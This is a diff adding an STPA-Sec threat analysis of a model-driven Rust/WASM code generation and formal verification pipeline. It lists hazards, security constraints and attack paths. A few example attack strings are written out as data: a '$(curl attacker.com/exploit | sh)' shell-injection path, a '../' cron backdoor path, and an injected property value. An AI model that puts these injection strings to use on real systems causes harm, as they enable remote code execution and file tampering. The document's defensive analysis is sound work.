@@ -1,0 +1,850 @@
+# STPA-Sec Analysis — Spar Code Generation & Verification Pipeline
+#
+# Security-focused STPA extension that treats security threats as losses.
+# Analyzes how an adversary could exploit the SysML v2 → AADL → codegen
+# → verification pipeline to produce compromised executable artifacts.
+#
+# Scope: the code generation pipeline (spar-codegen, spar-sysml2 lowering,
+# Bazel build rules, Lean4 proofs, Kani harnesses) is the primary attack
+# surface because attacker-controlled model input produces executable code.
+
+artifacts:
+
+  # ══════════════════════════════════════════════════════════════════════
+  # STEP 1a: Security Losses
+  # ══════════════════════════════════════════════════════════════════════
+
+  - id: L-SEC-1
+    type: loss
+    title: Attacker compromises generated code via model injection
+    description: >
+      An adversary crafts malicious SysML v2 or AADL input that causes
+      spar codegen to emit Rust source, WIT interfaces, TOML configs, or
+      BUILD.bazel files containing attacker-controlled content. The
+      generated code is compiled and deployed as a WASM component or
+      native binary in a safety-critical system, giving the attacker
+      arbitrary code execution within that component.
+    stakeholders: [system-integrator, certification-authority, end-user]
+
+  - id: L-SEC-2
+    type: loss
+    title: Verification bypass — proofs pass but code is unsafe
+    description: >
+      An adversary manipulates model properties (timing values,
+      component names, port configurations) such that the generated
+      Lean4 proofs and Kani harnesses verify successfully, but the
+      actual generated runtime code violates safety invariants. The
+      formal verification artifacts provide false assurance that the
+      system is safe.
+    stakeholders: [certification-authority, safety-reviewer, end-user]
+
+  - id: L-SEC-3
+    type: loss
+    title: SysML v2 model injection produces compromised AADL
+    description: >
+      An adversary supplies a crafted SysML v2 file that exploits the
+      lowering heuristics to produce AADL output with silently altered
+      semantics — wrong component categories, dropped connections,
+      injected property values — that downstream analysis and codegen
+      treat as correct. The resulting architecture has security-relevant
+      defects that are invisible to reviewers.
+    stakeholders: [system-integrator, safety-reviewer]
+
+  - id: L-SEC-4
+    type: loss
+    title: Build pipeline compromise via generated Bazel rules
+    description: >
+      Generated BUILD.bazel files or Cargo.toml manifests contain
+      references to attacker-controlled dependencies, repositories,
+      or toolchain paths. When the build system processes these files,
+      it fetches and executes malicious code during compilation, infecting
+      the build environment or the resulting artifacts.
+    stakeholders: [system-integrator, certification-authority]
+
+  - id: L-SEC-5
+    type: loss
+    title: Denial of verification through model complexity attack
+    description: >
+      An adversary supplies a model with exponential expansion
+      characteristics (deeply nested generics, recursive SysML v2
+      specializations, large array dimensions) that causes the codegen
+      or verification pipeline to consume unbounded resources, preventing
+      legitimate verification from completing.
+    stakeholders: [system-integrator, project-manager]
+
+  # ══════════════════════════════════════════════════════════════════════
+  # STEP 1b: Security Hazards
+  # ══════════════════════════════════════════════════════════════════════
+
+  - id: H-SEC-1
+    type: hazard
+    title: Unsanitized model names in generated source code
+    description: >
+      Component, port, package, and feature names from the AADL/SysML v2
+      model are interpolated directly into generated Rust source code,
+      WIT files, Lean4 proofs, Kani harnesses, TOML configs, and Bazel
+      BUILD files. The sanitize_ident function strips non-alphanumeric
+      characters but may not cover all injection vectors (e.g., Rust raw
+      strings, WIT keywords, Lean4 tactics, TOML escape sequences, Bazel
+      Starlark injection).
+    severity: critical
+    losses: [L-SEC-1, L-SEC-2]
+
+  - id: H-SEC-2
+    type: hazard
+    title: Property values injected into generated code without validation
+    description: >
+      Property values from the AADL model (timing values, dispatch
+      protocols, classifier references) are formatted directly into
+      generated Rust constants, TOML values, and Lean4 literals via
+      format! macros. A crafted property value string could escape the
+      expected context and inject arbitrary code or configuration.
+    severity: critical
+    losses: [L-SEC-1, L-SEC-2]
+
+  - id: H-SEC-3
+    type: hazard
+    title: SysML v2 lowering silently alters component semantics
+    description: >
+      The SysML v2 lowering uses heuristics (infer_category) to decide
+      AADL component categories. An adversary can craft a part def that
+      the heuristic misclassifies (e.g., a security-critical process
+      lowered as a system, bypassing thread-level scheduling analysis).
+      The wildcard `_ => {}` in lower_node silently drops unrecognized
+      SysML v2 constructs without diagnostics.
+    severity: critical
+    losses: [L-SEC-3]
+
+  - id: H-SEC-4
+    type: hazard
+    title: Generated workspace pulls untrusted dependencies
+    description: >
+      workspace_gen generates Cargo.toml with hardcoded dependency
+      versions (wit-bindgen, serde, serde_json, toml). If an attacker
+      can influence the process names in the model, crate names in the
+      workspace members could collide with malicious crates on crates.io.
+      The generated BUILD.bazel loads rules from relative paths that
+      assume a trusted workspace root.
+    severity: critical
+    losses: [L-SEC-4]
+
+  - id: H-SEC-5
+    type: hazard
+    title: Verification artifacts do not cover runtime behavior
+    description: >
+      Generated Lean4 proofs only verify scheduling properties (RTA).
+      Generated Kani harnesses only verify single-thread deadline bounds
+      in isolation (no interference). Neither covers data integrity,
+      memory safety of generated port structs, or correct dispatch
+      protocol behavior. An attacker can satisfy all verification
+      conditions while the runtime code has exploitable defects.
+    severity: critical
+    losses: [L-SEC-2]
+
+  - id: H-SEC-6
+    type: hazard
+    title: Codegen writes to arbitrary filesystem paths
+    description: >
+      The codegen CLI writes generated files to --output directory
+      using paths constructed from model element names. A crafted
+      component name containing path traversal sequences (../),
+      after sanitize_ident processing, could write files outside
+      the intended output directory.
+    severity: critical
+    losses: [L-SEC-1, L-SEC-4]
+
+  - id: H-SEC-7
+    type: hazard
+    title: Model complexity causes resource exhaustion
+    description: >
+      The codegen pipeline iterates over all_components() multiple
+      times with no bounds on component count. SysML v2 lowering
+      processes recursive specialization chains without depth limits.
+      An adversary can craft models that generate millions of
+      components, exhausting memory or producing terabytes of output.
+    severity: marginal
+    losses: [L-SEC-5]
+
+  # ══════════════════════════════════════════════════════════════════════
+  # STEP 1c: Security Constraints
+  # ══════════════════════════════════════════════════════════════════════
+
+  - id: SC-SEC-1
+    type: system-constraint
+    title: No code injection through model-derived identifiers
+    description: >
+      Names and values extracted from input models must be sanitized
+      before interpolation into any generated source file, configuration
+      file, or build file. Sanitization must be specific to the target
+      language (Rust, WIT, Lean4, TOML, Starlark).
+    hazards: [H-SEC-1, H-SEC-2]
+
+  - id: SC-SEC-2
+    type: system-constraint
+    title: Generated file paths must be confined to output directory
+    description: >
+      All generated file paths must be validated to resolve within the
+      specified output directory. Path traversal sequences must be
+      rejected.
+    hazards: [H-SEC-6]
+
+  - id: SC-SEC-3
+    type: system-constraint
+    title: Verification must cover safety-critical properties
+    description: >
+      Generated verification artifacts must cover the same safety
+      properties that the generated runtime code depends on. Gaps
+      between verified properties and runtime assumptions must be
+      documented.
+    hazards: [H-SEC-5]
+
+  - id: SC-SEC-4
+    type: system-constraint
+    title: SysML v2 lowering must not silently drop constructs
+    description: >
+      Unrecognized SysML v2 syntax kinds must produce diagnostics.
+      Category inference must be auditable and deterministic. Lowering
+      fidelity must be validated against reference SysML v2 models.
+    hazards: [H-SEC-3]
+
+  - id: SC-SEC-5
+    type: system-constraint
+    title: Generated build configurations must use pinned dependencies
+    description: >
+      Generated Cargo.toml and BUILD.bazel must use exact version pins,
+      checksum verification, or workspace-local paths. No generated file
+      may reference unpinned external registries.
+    hazards: [H-SEC-4]
+
+  - id: SC-SEC-6
+    type: system-constraint
+    title: Resource bounds on code generation
+    description: >
+      Code generation must enforce limits on the number of generated
+      files, total output size, and recursion depth during model
+      traversal.
+    hazards: [H-SEC-7]
+
+  # ══════════════════════════════════════════════════════════════════════
+  # STEP 2: Security Control Structure
+  # ══════════════════════════════════════════════════════════════════════
+
+  - id: CTRL-SEC-SYSML2
+    type: controller
+    title: SysML v2 Lowering Controller
+    controller-type: automated
+    source-file: crates/spar-sysml2/src/lower.rs
+    process-model:
+      - SysML v2 input may be adversary-controlled
+      - Category inference heuristic determines security-critical classification
+      - Unhandled syntax kinds are silently discarded (wildcard match)
+      - Extracted names are passed verbatim to ItemTree
+
+  - id: CTRL-SEC-CODEGEN
+    type: controller
+    title: Code Generation Controller
+    controller-type: automated
+    source-file: crates/spar-codegen/src/lib.rs
+    process-model:
+      - Instance model is trusted input (no re-validation after lowering)
+      - Component names become Rust identifiers, WIT names, file paths
+      - Property values become Rust constants and Lean4 literals
+      - Format strings interpolate model data without escaping
+      - Generated files are written to user-specified directory
+
+  - id: CTRL-SEC-PROOFGEN
+    type: controller
+    title: Proof Generation Controller
+    controller-type: automated
+    source-file: crates/spar-codegen/src/proof_gen.rs
+    process-model:
+      - Timing properties are trusted and become proof obligations
+      - Default values (10ms period, 1ms WCET) are silently substituted
+      - Lean4 tactics and Kani annotations are hardcoded templates
+      - Thread ordering determines priority assignment (implicit, not verified)
+
+  - id: CTRL-SEC-BUILDGEN
+    type: controller
+    title: Build File Generation Controller
+    controller-type: automated
+    source-file: crates/spar-codegen/src/workspace_gen.rs
+    process-model:
+      - Process names become crate names and workspace members
+      - Dependency versions are hardcoded in generator source
+      - BUILD.bazel loads rules from relative paths
+      - No integrity verification of generated build graph
+
+  - id: CTRL-SEC-VERUS
+    type: controller
+    title: Verus/Bazel Verification Controller
+    controller-type: automated
+    source-file: tools/bazel/rules_verus/defs.bzl
+    process-model:
+      - Verus binary is resolved from PATH or toolchain attribute
+      - Source file paths are passed directly to shell command
+      - Verification log is the only output (pass/fail)
+      - No content-level validation of proof results
+
+  # ── Security Controlled Processes ───────────────────────────────────
+
+  - id: CP-SEC-MODEL-INPUT
+    type: controlled-process
+    title: SysML v2 / AADL Input Files
+    description: >
+      Model files provided by users or CI pipelines. May be
+      attacker-controlled in supply chain scenarios.
+
+  - id: CP-SEC-GENERATED-CODE
+    type: controlled-process
+    title: Generated Source Code and Build Files
+    description: >
+      Rust source, WIT interfaces, TOML configs, BUILD.bazel,
+      Lean4 proofs, and Kani harnesses produced by codegen.
+
+  - id: CP-SEC-VERIFIED-ARTIFACTS
+    type: controlled-process
+    title: Verified and Compiled Artifacts
+    description: >
+      WASM components and native binaries produced after
+      verification and compilation of generated code.
+
+  # ── Security Control Actions ────────────────────────────────────────
+
+  - id: CA-SEC-LOWER
+    type: control-action
+    title: Lower SysML v2 to AADL
+    action: Transform SysML v2 CST into AADL ItemTree
+    source: CTRL-SEC-SYSML2
+    target: CP-SEC-MODEL-INPUT
+
+  - id: CA-SEC-GENERATE
+    type: control-action
+    title: Generate code from AADL model
+    action: Produce Rust, WIT, config, proof, and build files from instance model
+    source: CTRL-SEC-CODEGEN
+    target: CP-SEC-GENERATED-CODE
+
+  - id: CA-SEC-GENPROOF
+    type: control-action
+    title: Generate verification artifacts
+    action: Produce Lean4 proofs and Kani harnesses from timing properties
+    source: CTRL-SEC-PROOFGEN
+    target: CP-SEC-GENERATED-CODE
+
+  - id: CA-SEC-GENBUILD
+    type: control-action
+    title: Generate build configuration
+    action: Produce Cargo.toml and BUILD.bazel workspace files
+    source: CTRL-SEC-BUILDGEN
+    target: CP-SEC-GENERATED-CODE
+
+  - id: CA-SEC-VERIFY
+    type: control-action
+    title: Run formal verification
+    action: Execute Verus/Lean4/Kani on generated artifacts
+    source: CTRL-SEC-VERUS
+    target: CP-SEC-VERIFIED-ARTIFACTS
+
+  # ══════════════════════════════════════════════════════════════════════
+  # STEP 3: Unsafe Control Actions (Security Perspective)
+  # ══════════════════════════════════════════════════════════════════════
+
+  # ── SysML v2 Lowering UCAs ─────────────────────────────────────────
+
+  - id: UCA-SEC-1
+    type: uca
+    title: Lowering silently drops security-relevant constructs
+    uca-type: not-providing
+    context: >
+      A SysML v2 model contains constraint defs, allocation defs, or
+      requirement defs that encode security properties (access control,
+      encryption requirements, data classification). The wildcard
+      match arm in lower_node discards them without diagnostic.
+    rationale: >
+      Security constraints specified in the model are lost during
+      lowering. The generated AADL has no record of these constraints.
+      Downstream analysis and codegen proceed without them, producing
+      code that lacks required security controls.
+    controller: CTRL-SEC-SYSML2
+    hazards: [H-SEC-3]
+
+  - id: UCA-SEC-2
+    type: uca
+    title: Category heuristic misclassifies security-critical component
+    uca-type: providing
+    context: >
+      The infer_category heuristic examines child nodes for action/state
+      usages to distinguish system from process/thread. An adversary
+      crafts a part def with carefully chosen children that causes a
+      security-critical process (requiring thread-level isolation) to
+      be classified as a system (no scheduling constraints).
+    rationale: >
+      Misclassified component skips scheduling analysis, timing
+      verification, and ARINC 653 partition checks. Generated code
+      has no dispatch loop or timing constraints.
+    controller: CTRL-SEC-SYSML2
+    hazards: [H-SEC-3]
+
+  # ── Code Generation UCAs ───────────────────────────────────────────
+
+  - id: UCA-SEC-3
+    type: uca
+    title: Codegen interpolates unsanitized name into Rust source
+    uca-type: providing
+    context: >
+      A component or port name in the AADL model contains characters
+      that survive sanitize_ident but are meaningful in Rust syntax
+      context (e.g., names that produce valid but malicious Rust after
+      sanitization — a name like "r#unsafe" or numeric-leading names
+      that become valid after underscore prefixing).
+    rationale: >
+      Generated Rust code contains attacker-influenced identifiers.
+      While sanitize_ident limits to alphanumeric + underscore, the
+      resulting identifier could shadow Rust keywords, standard library
+      types, or safety-critical trait implementations.
+    controller: CTRL-SEC-CODEGEN
+    hazards: [H-SEC-1]
+
+  - id: UCA-SEC-4
+    type: uca
+    title: Codegen embeds property value in Rust constant without bounds
+    uca-type: providing
+    context: >
+      A timing property (Period, WCET, Deadline) in the model has an
+      extreme value (e.g., Period => 0 ps, or Period => 18446744073709551615 ps)
+      that becomes a Rust u64 constant. The generated code and proofs
+      use this value without range validation.
+    rationale: >
+      Zero period causes division-by-zero in utilization computations.
+      Maximum u64 causes overflow in scheduling calculations. Generated
+      Kani harnesses with extreme values may vacuously pass.
+    controller: CTRL-SEC-CODEGEN
+    hazards: [H-SEC-2]
+
+  - id: UCA-SEC-5
+    type: uca
+    title: Codegen writes file outside output directory
+    uca-type: providing
+    context: >
+      A component name like "../../../../etc/cron.d/backdoor" passes
+      through sanitize_ident (which strips slashes) to become
+      "etc_cron_d_backdoor". However, the generated file path
+      format!("crates/{name}/src/lib.rs") uses the process name
+      directly. If a secondary path construction step is added that
+      does not use sanitize_ident, path traversal is possible.
+    rationale: >
+      Files written outside the output directory could overwrite
+      build system files, CI configurations, or other source code,
+      enabling persistent compromise of the repository.
+    controller: CTRL-SEC-CODEGEN
+    hazards: [H-SEC-6]
+
+  - id: UCA-SEC-6
+    type: uca
+    title: Codegen produces WIT with type confusion
+    uca-type: providing
+    context: >
+      An AADL port has a classifier reference that maps to a WIT type
+      name colliding with a WIT built-in (e.g., "string", "list",
+      "option"). The generated WIT file uses this name as a custom
+      type, creating ambiguity. When the WIT is compiled via
+      wasm-tools, the built-in type may be used instead of the
+      intended custom type.
+    rationale: >
+      Type confusion in the WIT interface allows a malicious component
+      to send data that the host interprets as a different type,
+      potentially bypassing capability restrictions or causing
+      memory safety issues in the runtime.
+    controller: CTRL-SEC-CODEGEN
+    hazards: [H-SEC-1]
+
+  # ── Proof Generation UCAs ──────────────────────────────────────────
+
+  - id: UCA-SEC-7
+    type: uca
+    title: Proof generator substitutes default timing values
+    uca-type: providing
+    context: >
+      When a thread has no explicit timing properties, proof_gen
+      substitutes defaults (10ms period, 1ms WCET). These defaults
+      make scheduling proofs trivially satisfiable (10% utilization).
+      An adversary omits timing properties from the model.
+    rationale: >
+      The generated Lean4 proof passes with default values that do
+      not match the actual runtime behavior. The verification
+      evidence is meaningless but appears valid in the certification
+      package.
+    controller: CTRL-SEC-PROOFGEN
+    hazards: [H-SEC-5]
+
+  - id: UCA-SEC-8
+    type: uca
+    title: Kani harness verifies only base case without interference
+    uca-type: stopped-too-soon
+    context: >
+      The generated Kani harness sets response_time = wcet (the
+      no-interference case). Higher-priority thread interference
+      is not modeled. The comment says "base case (no interference)"
+      but the harness name says "no_deadline_miss" without qualification.
+    rationale: >
+      The harness provides a false sense of coverage. A reviewer
+      sees "verify_{name}_no_deadline_miss" passes and concludes
+      the thread meets its deadline under all conditions. In reality,
+      only the trivial base case is checked.
+    controller: CTRL-SEC-PROOFGEN
+    hazards: [H-SEC-5]
+
+  # ── Build Generation UCAs ──────────────────────────────────────────
+
+  - id: UCA-SEC-9
+    type: uca
+    title: Generated Cargo.toml uses unpinned dependency versions
+    uca-type: providing
+    context: >
+      workspace_gen hardcodes wit-bindgen = "0.36", serde = "1",
+      serde_json = "1", toml = "0.8". These use semver ranges, not
+      exact pins. A dependency confusion or typosquatting attack
+      on crates.io could serve malicious versions.
+    rationale: >
+      The generated workspace compiles and runs malicious dependency
+      code. Since the workspace is auto-generated, engineers may
+      not review its Cargo.toml as carefully as hand-written code.
+    controller: CTRL-SEC-BUILDGEN
+    hazards: [H-SEC-4]
+
+  - id: UCA-SEC-10
+    type: uca
+    title: Generated crate names may collide with public registry
+    uca-type: providing
+    context: >
+      Process names from the AADL model become crate names in the
+      generated Cargo.toml (e.g., process "serde" creates a crate
+      named "serde"). If cargo resolves this ambiguously, it could
+      pull the public crate instead of the local workspace member.
+    rationale: >
+      Dependency confusion attack: the build system fetches a
+      malicious crate from crates.io instead of using the locally
+      generated code. The resulting binary contains attacker code.
+    controller: CTRL-SEC-BUILDGEN
+    hazards: [H-SEC-4]
+
+  # ── Verification Pipeline UCAs ─────────────────────────────────────
+
+  - id: UCA-SEC-11
+    type: uca
+    title: Verus rule passes shell-injectable paths
+    uca-type: providing
+    context: >
+      The verus_verify Bazel rule constructs a shell command by
+      joining source file paths with spaces. A source file path
+      containing shell metacharacters (;, |, $, backticks) could
+      inject arbitrary commands into the verification step.
+    rationale: >
+      Arbitrary command execution during the build. Since Verus
+      runs as a trusted tool in the build pipeline, injected
+      commands inherit build system permissions.
+    controller: CTRL-SEC-VERUS
+    hazards: [H-SEC-1, H-SEC-4]
+
+  - id: UCA-SEC-12
+    type: uca
+    title: wasm-tools component new accepts unverified core module
+    uca-type: not-providing
+    context: >
+      The wasm_component Bazel rule packages a core WASM module
+      into a component without verifying that the core module was
+      produced by the expected cargo build. If the core module is
+      substituted (build cache poisoning), the component embeds
+      attacker code.
+    rationale: >
+      The WASM component appears legitimate (correct WIT interface)
+      but contains a backdoored implementation. The WIT type
+      checking passes because the interface is correct; only the
+      implementation is compromised.
+    controller: CTRL-SEC-VERUS
+    hazards: [H-SEC-1, H-SEC-2]
+
+  # ══════════════════════════════════════════════════════════════════════
+  # STEP 3b: Security Controller Constraints
+  # ══════════════════════════════════════════════════════════════════════
+
+  - id: CC-SEC-1
+    type: controller-constraint
+    title: Language-specific sanitization for all generated code
+    constraint: >
+      Every model-derived string interpolated into generated source
+      must pass through a sanitizer specific to the target language.
+      Rust: validate against keyword list, ensure identifier rules.
+      WIT: reject built-in type names. Lean4: reject tactic keywords.
+      TOML: escape special characters. Starlark: reject built-ins.
+    controller: CTRL-SEC-CODEGEN
+    ucas: [UCA-SEC-3, UCA-SEC-6]
+    hazards: [H-SEC-1]
+
+  - id: CC-SEC-2
+    type: controller-constraint
+    title: Timing property bounds validation before code generation
+    constraint: >
+      Before generating code or proofs, timing properties must be
+      validated: period > 0, wcet > 0, wcet <= deadline <= period.
+      Properties outside these bounds must produce error diagnostics
+      and must not be substituted with defaults.
+    controller: CTRL-SEC-CODEGEN
+    ucas: [UCA-SEC-4, UCA-SEC-7]
+    hazards: [H-SEC-2]
+
+  - id: CC-SEC-3
+    type: controller-constraint
+    title: Output path confinement
+    constraint: >
+      All generated file paths must be canonicalized and verified
+      to be descendants of the output directory. Path components
+      derived from model names must be re-sanitized at the point
+      of path construction.
+    controller: CTRL-SEC-CODEGEN
+    ucas: [UCA-SEC-5]
+    hazards: [H-SEC-6]
+
+  - id: CC-SEC-4
+    type: controller-constraint
+    title: SysML v2 lowering must diagnose unhandled constructs
+    constraint: >
+      The wildcard match arm in lower_node must emit a diagnostic
+      for any SyntaxKind that represents a semantic construct (not
+      whitespace or punctuation). Category inference must log the
+      decision rationale.
+    controller: CTRL-SEC-SYSML2
+    ucas: [UCA-SEC-1, UCA-SEC-2]
+    hazards: [H-SEC-3]
+
+  - id: CC-SEC-5
+    type: controller-constraint
+    title: Generated dependencies must use exact version pins with checksums
+    constraint: >
+      Generated Cargo.toml must use exact version pins (= prefix)
+      or workspace-level Cargo.lock. Generated BUILD.bazel must
+      reference content-addressed artifacts. No semver ranges in
+      generated dependency specifications.
+    controller: CTRL-SEC-BUILDGEN
+    ucas: [UCA-SEC-9, UCA-SEC-10]
+    hazards: [H-SEC-4]
+
+  - id: CC-SEC-6
+    type: controller-constraint
+    title: Verification harnesses must document coverage scope
+    constraint: >
+      Generated Kani harnesses and Lean4 proofs must include
+      machine-readable annotations documenting which properties
+      are verified and which are out of scope. Harness names
+      must not overstate the verification scope.
+    controller: CTRL-SEC-PROOFGEN
+    ucas: [UCA-SEC-7, UCA-SEC-8]
+    hazards: [H-SEC-5]
+
+  - id: CC-SEC-7
+    type: controller-constraint
+    title: Bazel rules must not construct shell commands from paths
+    constraint: >
+      Verus and wasm-tools Bazel rules must use ctx.actions.run
+      (argument list) instead of ctx.actions.run_shell (string
+      interpolation) to prevent shell injection via file paths.
+    controller: CTRL-SEC-VERUS
+    ucas: [UCA-SEC-11]
+    hazards: [H-SEC-1]
+
+  - id: CC-SEC-8
+    type: controller-constraint
+    title: WASM component must verify provenance of core module
+    constraint: >
+      The wasm_component rule must verify that the core WASM module
+      was produced by the expected cargo build action (via Bazel
+      dependency graph), not merely that a .wasm file exists in the
+      expected location.
+    controller: CTRL-SEC-VERUS
+    ucas: [UCA-SEC-12]
+    hazards: [H-SEC-1, H-SEC-2]
+
+  # ══════════════════════════════════════════════════════════════════════
+  # STEP 4: Loss Scenarios (Attack Paths)
+  # ══════════════════════════════════════════════════════════════════════
+
+  - id: LS-SEC-1
+    type: loss-scenario
+    title: "Attack path: model-driven code injection via component name"
+    scenario-type: inadequate-control-algorithm
+    description: >
+      An attacker contributes a SysML v2 model file to a shared repository.
+      The model contains a part def named "r#mod". During SysML v2 lowering,
+      extract_name produces "r#mod". sanitize_ident converts it to "r_mod"
+      (valid Rust identifier). The generated Rust code includes
+      `pub struct RModPorts { ... }` — benign. However, the attacker also
+      includes a property association with value "0; std::process::exit(1)//"
+      which, after format! interpolation into a comment or doc attribute,
+      could be rendered adjacent to executable code in an unexpected context.
+      While current sanitize_ident prevents direct identifier injection, the
+      attack surface exists in property value interpolation into const values,
+      doc comments, and config file strings.
+    causal-factors:
+      - Property values are not validated against a strict grammar
+      - Format strings in rust_gen interpolate property values into comments
+      - TOML config_gen writes property values into TOML string fields
+      - No integration test verifying generated code compiles safely
+    uca: [UCA-SEC-3, UCA-SEC-4]
+    hazards: [H-SEC-1, H-SEC-2]
+
+  - id: LS-SEC-2
+    type: loss-scenario
+    title: "Attack path: timing property manipulation for proof bypass"
+    scenario-type: inadequate-process-model
+    description: >
+      An attacker modifies an AADL model to set Compute_Execution_Time =>
+      0 ps .. 1 ps for a thread that actually runs for 5ms. The codegen
+      pipeline generates a Kani harness with WCET_PS = 1 (1 picosecond)
+      and PERIOD_PS = 10_000_000_000 (10ms). The harness
+      verify_*_no_deadline_miss trivially passes: any wcet <= 1 is well
+      within the 10ms deadline. The Lean4 proof similarly passes because
+      the utilization is 0.0000001%. Meanwhile, the actual thread exceeds
+      its real deadline. The generated verification evidence shows "all
+      proofs pass" with no indication that the input values were anomalous.
+    causal-factors:
+      - No sanity check on timing property magnitudes
+      - Default substitution (1ms WCET) masks missing properties
+      - Kani harness checks base case only, no interference model
+      - No cross-reference between analysis results and proof inputs
+    uca: [UCA-SEC-4, UCA-SEC-7, UCA-SEC-8]
+    hazards: [H-SEC-2, H-SEC-5]
+
+  - id: LS-SEC-3
+    type: loss-scenario
+    title: "Attack path: SysML v2 category confusion for partition bypass"
+    scenario-type: inadequate-control-algorithm
+    description: >
+      An attacker crafts a SysML v2 part def for a security monitor
+      component. The part def body contains no action or state usages —
+      only port defs and attribute usages. The infer_category heuristic
+      classifies it as "system" (the default for parts without
+      software-like children). In AADL, system components have no
+      scheduling constraints. The security monitor, which should run
+      as a periodic thread within an ARINC 653 partition, is instead
+      modeled as a system with no dispatch loop. No scheduling analysis
+      runs. No ARINC 653 partition check applies. The monitor can be
+      starved by other components.
+    causal-factors:
+      - infer_category defaults to System for unrecognized patterns
+      - No annotation or override mechanism for explicit category
+      - SysML v2 has no direct equivalent of AADL component categories
+      - No warning when heuristic is applied to security-critical component
+    uca: [UCA-SEC-2]
+    hazards: [H-SEC-3]
+
+  - id: LS-SEC-4
+    type: loss-scenario
+    title: "Attack path: dependency confusion via generated workspace"
+    scenario-type: inadequate-control-algorithm
+    description: >
+      An AADL model defines processes named "serde", "tokio", and "rand".
+      workspace_gen produces Cargo.toml with workspace members
+      crates/serde, crates/tokio, crates/rand. These are also listed as
+      [workspace.dependencies] with path = "crates/{name}". However, the
+      per-crate Cargo.toml also depends on `serde = { workspace = true }`
+      from [workspace.dependencies] — which resolves to the local path.
+      The risk emerges if an engineer adds an external dependency that
+      transitively depends on "serde" (the real one): cargo's resolver
+      must choose between the local "serde" (which is an AADL-generated
+      skeleton with no serde functionality) and the crates.io version.
+      This causes a build failure at best, or silent miscompilation if
+      the generated crate happens to export expected symbols.
+    causal-factors:
+      - Process names become crate names without collision checking
+      - No reserved name list for common Rust ecosystem crates
+      - Workspace dependency resolution is complex and implicit
+      - Generated code is not reviewed with same rigor as hand-written
+    uca: [UCA-SEC-10]
+    hazards: [H-SEC-4]
+
+  - id: LS-SEC-5
+    type: loss-scenario
+    title: "Attack path: shell injection via Verus verification rule"
+    scenario-type: inadequate-control-algorithm
+    description: >
+      The verus_verify rule constructs a shell command:
+      `{verus_cmd} 2>&1 | tee {log}` where verus_cmd is built by
+      joining `[verus] + extra_args + src_paths`. If a source file
+      path contains shell metacharacters (possible in Bazel labels
+      or when paths are constructed from model names), the shell
+      interprets them. For example, a file path containing
+      `$(curl attacker.com/exploit | sh)` would execute during
+      verification. While Bazel typically controls file paths, the
+      rules_verus defs.bzl uses run_shell which is inherently unsafe
+      for path handling.
+    causal-factors:
+      - run_shell with string formatting instead of run with arg list
+      - Source paths not shell-escaped before interpolation
+      - Bazel labels can contain unusual characters
+      - No allowlist for source file path characters
+    uca: [UCA-SEC-11]
+    hazards: [H-SEC-1, H-SEC-4]
+
+  - id: LS-SEC-6
+    type: loss-scenario
+    title: "Attack path: WASM component substitution via build cache"
+    scenario-type: inadequate-feedback
+    description: >
+      The wasm_component rule's first step runs `cargo build` and then
+      uses `find` to locate the produced .wasm file. An attacker who
+      can write to the target directory (e.g., via a compromised build
+      cache or shared CI runner) places a backdoored .wasm file in
+      target/{target}/release/deps/ before cargo runs. The `find | head -1`
+      picks up the attacker's file. The second step (wasm-tools component
+      new) packages it into a valid WASM component. The final artifact
+      has correct WIT types but backdoored implementation.
+    causal-factors:
+      - Using find with head instead of cargo's --message-format=json output
+      - No checksum verification of cargo build output
+      - target/ directory may be shared across builds
+      - WASM component packaging does not verify module provenance
+    uca: [UCA-SEC-12]
+    hazards: [H-SEC-1, H-SEC-2]
+
+  - id: LS-SEC-7
+    type: loss-scenario
+    title: "Attack path: resource exhaustion via model complexity bomb"
+    scenario-type: inadequate-control-algorithm
+    description: >
+      An attacker provides a SysML v2 model with 10,000 part defs,
+      each containing 100 port defs, resulting in 1,000,000 features.
+      The codegen pipeline generates Rust files with 1,000,000-field
+      structs, WIT files with 1,000,000 functions, and Lean4 proofs
+      with 1,000,000 theorems. The output is hundreds of gigabytes.
+      The build system and verification tools cannot process this,
+      effectively denying verification for the entire project.
+    causal-factors:
+      - No limit on number of components, features, or connections
+      - No limit on total generated output size
+      - all_components() iterates without bounds
+      - No incremental generation for large models
+    uca: [UCA-SEC-7]
+    hazards: [H-SEC-7]
+
+  - id: LS-SEC-8
+    type: loss-scenario
+    title: "Attack path: SysML v2 wildcard drops security annotations"
+    scenario-type: inadequate-control-algorithm
+    description: >
+      A SysML v2 model uses requirement defs and constraint defs to
+      specify security properties: "data in transit must be encrypted",
+      "component must run in isolated partition". The lower_node function
+      has handlers for REQUIREMENT_DEF and CONSTRAINT_DEF that convert
+      them to AADL property annotations. However, if these constructs
+      appear inside a context that routes through the wildcard `_ => {}`
+      (e.g., nested inside a flow def or verification case that is not
+      handled), the security annotations are silently dropped. The
+      generated AADL and subsequent code have no record of the
+      security requirements.
+    causal-factors:
+      - Wildcard match arm discards unrecognized children without diagnostic
+      - Nested constructs may not be recursively processed
+      - No validation that all requirement defs appear in output
+      - No completeness check comparing input construct count to output
+    uca: [UCA-SEC-1]
+    hazards: [H-SEC-3]
